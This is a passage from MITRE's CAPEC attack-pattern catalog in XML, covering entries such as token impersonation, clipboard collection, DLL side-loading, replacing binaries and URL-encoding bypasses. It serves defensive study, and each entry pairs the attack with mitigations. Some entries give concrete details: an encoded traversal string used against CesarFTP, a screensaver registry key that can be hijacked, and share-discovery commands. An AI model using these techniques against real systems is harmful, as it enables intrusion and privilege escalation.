               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="633" Name="Token Impersonation" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <Exclude_Related Exclude_ID="403"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1134</Entry_ID>
               <Entry_Name>Access Token Manipulation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-04-12</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="634" Name="Probe Audio and Video Peripherals" Abstraction="Detailed" Status="Stable">
         <Description>The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="651"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="545"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Knowledge of the target device's or application’s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">To deploy a hidden process or malware on the system to automatically collect audio and video data.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Prevent unknown code from executing on a system through whitelisting policy.</Mitigation>
            <Mitigation>Patch installed applications as soon as new updates become available.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="267"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1123</Entry_ID>
               <Entry_Name>Audio Capture</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1125</Entry_ID>
               <Entry_Name>Video Capture</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="635" Name="Alternative Execution Due to Deceptive Filenames" Abstraction="Standard" Status="Draft">
         <Description>The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="165"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The use of the file must be controlled by the file extension.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Applications should insure that the content of the file is consistent with format it is expecting, and not depend solely on the file extension.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="162"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="636" Name="Hiding Malicious Data or Code within Files" Abstraction="Standard" Status="Draft">
         <Description>Files on various operating systems can have a complex format which allows for the storage of other data, in addition to its contents. Often this is metadata about the file, such as a cached thumbnail for an image file. Unless utilities are invoked in a particular way, this data is not visible during the normal use of the file. It is possible for an attacker to store malicious data or code using these facilities, which would be difficult to discover.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="165"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The operating system must support a file system that allows for alternate data storage for a file.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Many tools are available to search for the hidden data. Scan regularly for such data using one of these tools.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1223</Entry_ID>
               <Entry_Name>Compiled HTML File</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-493"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="637" Name="Collect Data from Clipboard" Abstraction="Detailed" Status="Stable">
         <Description>The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which he is unauthorized.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have a means (i.e., a pre-installed tool or background process) by which to collect data from the clipboard and store it. That is, when the target copies data to the clipboard (e.g., to paste into another application), the adversary needs some means of capturing that data in a third location.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">To deploy a hidden process or malware on the system to automatically collect clipboard data.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>While copying and pasting of data with the clipboard is a legitimate and practical function, certain situations and context may require the disabling of this feature. Just as certain applications disable screenshot capability, applications that handle highly sensitive information should consider disabling copy and paste functionality.</Mitigation>
            <Mitigation>Employ a robust identification and audit/blocking via whitelisting of applications on your system. Malware may contain the functionality associated with this attack pattern.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="267"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1115</Entry_ID>
               <Entry_Name>Clipboard Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="638" Name="Altered Component Firmware" Abstraction="Detailed" Status="Stable">
         <Description>An adversary with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="452"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge about the installed target system design.</Prerequisite>
            <Prerequisite>Advanced knowledge about the download and update installation processes.</Prerequisite>
            <Prerequisite>Access to the download and update system(s) used to deliver BIOS images.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.</Example>
         </Example_Instances>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1109</Entry_ID>
               <Entry_Name>Component Firmware</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="639" Name="Probe System Files" Abstraction="Detailed" Status="Stable">
         <Description>An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="545"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary has access to the file system of a system.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.</Example>
            <Example>Adversaries may search network shares on computers they have compromised to find files of interest.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="552"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1081</Entry_ID>
               <Entry_Name>Credentials in Files</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1039</Entry_ID>
               <Entry_Name>Data from Network Shared Drive</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-04</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="64" Name="Using Slashes and URL Encoding Combined to Bypass Validation Logic" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker accesses the server using a specific URL.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker crafts a malicious URL string request and sends it to the server.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application accepts and decodes URL string request.</Prerequisite>
            <Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can try special characters in the URL and bypass the URL validation.</Skill>
            <Skill Level="Medium">The attacker may write a script to defeat the input filtering mechanism.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.</Indicator>
            <Indicator>Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</Mitigation>
            <Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.</Mitigation>
            <Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</Mitigation>
            <Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</Mitigation>
            <Mitigation>Refer to the RFCs to safely decode URL.</Mitigation>
            <Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</Mitigation>
            <Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Attack Example: Combined Encodings CesarFTP</xhtml:p>
               <xhtml:p>Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks.</xhtml:p>
               <xhtml:p>An attacker could provide a URL that included a string like</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">/...%5C/</xhtml:div>
               <xhtml:p>This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.</xhtml:p>See also: CVE-2001-1335</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="177"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="73"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="22"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-495"/>
            <Reference External_Reference_ID="REF-496"/>
            <Reference External_Reference_ID="REF-497"/>
            <Reference External_Reference_ID="REF-498" Section="URL Encoding Reference"/>
            <Reference External_Reference_ID="REF-499"/>
            <Reference External_Reference_ID="REF-500" Section="5.11.4. Validating Hypertext Links (URIs/URLs)"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Obfuscation_Techniques, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="640" Name="Inclusion of Code in Existing Process" Abstraction="Detailed" Status="Stable">
         <Description>The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, and more.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="251"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Knowledge of how to load malicious code into the memory space of a running process, as well as the ability to have the running process execute this code. For example, with DLL injection, the adversary must know how to load a DLL into the memory space of another running process, and cause this process to execute the code inside of the DLL.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Prevent unknown or malicious software from loading through whitelisting policy.</Mitigation>
            <Mitigation>Properly restrict the location of the software being used.</Mitigation>
            <Mitigation>Leverage security kernel modules providing advanced access control and process restrictions like SELinux.</Mitigation>
            <Mitigation>Monitor API calls like CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and similar for Windows.</Mitigation>
            <Mitigation>Monitor API calls like ptrace system call, use of LD_PRELOAD environment variable, dlfcn dynamic linking API calls, and similar for Linux.</Mitigation>
            <Mitigation>Monitor processes and command-line arguments for unknown behavior related to code injection.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1055</Entry_ID>
               <Entry_Name>Process Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="641" Name="DLL Side-Loading" Abstraction="Detailed" Status="Stable">
         <Description>An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="159"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must fail to verify the integrity of the DLL before using them.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Trick the operating system in loading a malicious DLL instead of a legitimate DLL.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Prevent unknown DLLs from loading through whitelisting policy.</Mitigation>
            <Mitigation>Patch installed applications as soon as new updates become available.</Mitigation>
            <Mitigation>Properly restrict the location of the software being used.</Mitigation>
            <Mitigation>Use of sxstrace.exe on Windows as well as manual inspection of the manifests.</Mitigation>
            <Mitigation>Require code signing and avoid using relative paths for resources.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="706"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1073</Entry_ID>
               <Entry_Name>DLL Side-Loading</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1177</Entry_ID>
               <Entry_Name>LSASS Driver</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-501"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="642" Name="Replace Binaries" Abstraction="Detailed" Status="Draft">
         <Description>Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must be able to place the malicious binary on the target machine.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.</Example>
            <Example>By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:\Windows\system32\. This value is set in the registry at HKEY_CURRENT_USER\Control Panel\Desktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1044</Entry_ID>
               <Entry_Name>File System Permissions Weakness</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1180</Entry_ID>
               <Entry_Name>Screensaver</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-05-31</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Example_Instances, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="643" Name="Identify Shared Files/Directories on System" Abstraction="Detailed" Status="Draft">
         <Description>An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="309"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary, or his malware, can simply employ a set of commands that search for shared drives on the system (e.g., net view \\remote system or net share).</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information, and audit and/or block them by using whitelisting tools.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="267"/>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1135</Entry_ID>
               <Entry_Name>Network Share Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2018-07-31</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="644" Name="Use of Captured Hashes (Pass The Hash)" Abstraction="Detailed" Status="Stable">
